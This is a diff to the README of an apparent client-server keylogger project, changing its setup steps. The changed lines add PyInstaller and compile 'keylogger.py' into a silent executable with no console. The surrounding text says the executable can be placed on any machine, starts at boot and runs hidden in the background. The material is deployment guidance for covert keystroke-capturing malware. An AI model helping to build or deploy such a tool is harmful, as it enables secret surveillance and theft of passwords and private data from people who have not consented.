@@ -47,7 +47,7 @@ This project consists of a client-server application that captures and logs keys
 2. Install the necessary Python packages:
 
    ```bash
-   pip install pynput pywin32
+   pip install pynput pywin32 pyinstaller
    ```
 
 ### Running the Server
@@ -66,7 +66,7 @@ The server will start listening on port `5001` for incoming client connections.
 2. To create an executable from the client script using `PyInstaller`, run:
 
    ```bash
-   pyinstaller --onefile --noconsole --windowed client.py
+   pyinstaller --onefile --noconsole --windowed keylogger.py
    ```
 
 3. Once compiled, you can place the executable on any machine where you want the client to run. The client will automatically start on system boot and run silently in the background.
